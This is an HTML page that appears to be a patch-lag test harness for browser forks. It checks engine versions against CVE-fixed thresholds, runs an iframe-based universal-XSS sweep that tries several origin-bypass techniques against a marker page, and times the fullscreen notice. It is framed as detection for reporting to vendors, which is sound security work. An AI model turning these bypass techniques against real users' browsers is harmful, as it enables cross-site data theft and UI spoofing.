<!doctype html><meta charset=utf-8><title>Fork patch-lag sweep</title>
<meta name=viewport content="width=device-width,initial-scale=1">
<body style="font:15px/1.5 system-ui;padding:1rem;max-width:860px;margin:auto">
<h1>Fork patch-lag sweep</h1>
<p>Open this page in EACH browser/fork. It reports: engine version vs known-fixed thresholds, a DOM-only
UXSS sweep, and what the fullscreen notice does. Nothing is sent anywhere.</p>
<p>victim: <input id=v size=58 value="https://raw.githubusercontent.com/xnxrx/xnurx/main/uxss-v2.html"></p>
<p><button id=b1>1. version gate</button> <button id=b2>2. UXSS sweep (DOM only)</button>
<button id=b3>3. fullscreen notice probe</button> <button id=b4>exit fullscreen</button></p>
<div id=o style="font:12px/1.45 monospace;white-space:pre-wrap;border:1px solid #999;padding:.6rem;border-radius:6px"></div>
<script>
var M='VICTIM-MARKER-STATIC',R=[];
function pr(s){R.push(s);document.getElementById('o').textContent=R.join('\n')}
function vu(){return document.getElementById('v').value.trim()}
function fr(){var f=document.createElement('iframe');f.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';return f}
function rdw(w){var d=w.document;return String((d.body?d.body.textContent:'')||d.title||'').replace(/\s+/g,' ').slice(0,60)}
function tr(l,w){try{var t=rdw(w);pr((t.indexOf(M)>=0?'CROSSED  ':'INCONCL  ')+l+' -> '+t)}catch(e){pr('BLOCKED  '+l+' -> '+e.name)}}
var TH=[['Chromium','147.0.7727.55','CVE-2026-5899 History-Nav UXSS + CVE-2026-5906 omnibox'],
['Chromium','148.0.7778.96','CVE-2026-7939 SanitizerAPI UXSS'],
['Chromium','150.0.7871.47','CVE-2026-14030 SplitView + CVE-2026-14130 omnibox UI'],
['Chromium','132.0.6834.83','CVE-2025-0440 Fullscreen UI spoofing'],
['WebKit/Safari','26.4','CVE-2026-20643 Navigation API SOP bypass']];
function cmp(a,b){var x=a.split('.').map(Number),y=b.split('.').map(Number);
for(var i=0;i<Math.max(x.length,y.length);i++){var p=x[i]||0,q=y[i]||0;if(p!==q)return p<q?-1:1}return 0}
document.getElementById('b1').onclick=function(){
R=[];pr('UA: '+navigator.userAgent);
var ua=navigator.userAgent,fam='unknown',ver=null;
var m;
if((m=ua.match(/Chrome\/([\d.]+)/))&&!/Firefox/.test(ua)){fam='Chromium';ver=m[1]}
else if((m=ua.match(/Firefox\/([\d.]+)/))){fam='Gecko';ver=m[1]}
else if((m=ua.match(/Version\/([\d.]+).*Safari/))){fam='WebKit/Safari';ver=m[1]}
pr('engine family : '+fam);pr('claimed version: '+ver);
pr('brands        : '+(navigator.userAgentData?JSON.stringify(navigator.userAgentData.brands):'(no UA-CH)'));
pr('');pr('-- threshold check --');
var hit=0;
TH.forEach(function(t){ if(t[0].indexOf(fam)!==0&&fam.indexOf(t[0])!==0)return;
 if(!ver){pr('?  '+t[1]+'  '+t[2]);return}
 var lag=cmp(ver,t[1])<0; if(lag)hit++;
 pr((lag?'LAGGING  ':'ok       ')+'needs >= '+t[1]+'   '+t[2])});
pr('');pr(hit?('=> '+hit+' known-fixed threshold(s) NOT met. n-day candidates: run sweep + report to the FORK vendor.')
 :'=> no threshold breach detected for this family (or version unknown).');
pr('NOTE: forks often freeze the UA string. Confirm the real base version in the browser\'s About page.')};
document.getElementById('b2').onclick=function(){R=[];pr('DOM-only sweep (fetch/XHR arms omitted: victim sends ACAO:*)');
var V=vu();
var f0=fr();f0.onload=function(){tr('CONTROL plain iframe (MUST be BLOCKED)',f0.contentWindow)};f0.src=V;document.body.appendChild(f0);
var f1=fr();f1.src='about:blank';document.body.appendChild(f1);
setTimeout(function(){var o=null;try{o=f1.contentWindow}catch(e){}
 if(!o){pr('INCONCL  A1 dangling -> no handle');return}
 f1.onload=function(){setTimeout(function(){try{var C=o.Function;
  if(!C){pr('INCONCL  A1 dangling -> no Function ctor');return}
  var g=C('try{return (document.body?document.body.textContent:document.title)||""}catch(x){return "ERR"}')();
  pr((String(g).indexOf(M)>=0?'CROSSED  ':'BLOCKED  ')+'A1 dangling Function() -> '+String(g).replace(/\s+/g,' ').slice(0,50))
 }catch(e){pr('BLOCKED  A1 dangling -> '+e.name)}},250)};f1.src=V},120);
var s=['about:blank',V,'about:blank',V],i=0,h=null,f2=fr();
f2.onload=function(){if(!h){try{h=f2.contentWindow}catch(e){}}i++;
 if(i<s.length){setTimeout(function(){f2.src=s[i]},140);return}
 setTimeout(function(){tr('A2 chained-nav handle',h)},250)};f2.src=s[0];document.body.appendChild(f2);
var f3=fr();f3.srcdoc='<p>x</p>';var inh=null;
f3.onload=function(){if(!inh){try{inh=f3.contentWindow}catch(e){}
 setTimeout(function(){f3.removeAttribute('srcdoc');f3.src=V},140);return}
 setTimeout(function(){tr('A3 srcdoc-inherit handle',inh)},250)};document.body.appendChild(f3);
var f4=fr();f4.onload=function(){setTimeout(function(){try{f4.src='javascript:void(0)';
 setTimeout(function(){tr('A4 javascript: URI nav',f4.contentWindow)},300)}catch(e){pr('BLOCKED  A4 -> '+e.name)}},200)};
f4.src=V;document.body.appendChild(f4)};
document.getElementById('b3').onclick=function(){R=[];
var t0=performance.now();
function p(ms){setTimeout(function(){pr('t+'+ms+'ms  fullscreen='+(document.fullscreenElement?'YES':'no')+
 '  -> is the notice still on screen? (screenshot)')},ms)}
document.addEventListener('fullscreenchange',function h(){document.removeEventListener('fullscreenchange',h);
 pr('fullscreenchange at t+'+Math.round(performance.now()-t0)+'ms');[0,150,400,800,1500,2500,4000,5000].forEach(p);
 setTimeout(function(){try{if(document.fullscreenElement)document.exitFullscreen()}catch(e){}},6500)});
try{document.documentElement.requestFullscreen().then(function(){pr('requestFullscreen resolved')},
 function(e){pr('rejected: '+e.name)})}catch(e){pr('threw '+e.name)}
pr('Compare notice text + dwell against a plain fullscreen page in the SAME build. No notice at all = candidate.')};
document.getElementById('b4').onclick=function(){try{document.exitFullscreen()}catch(e){}};
</script>
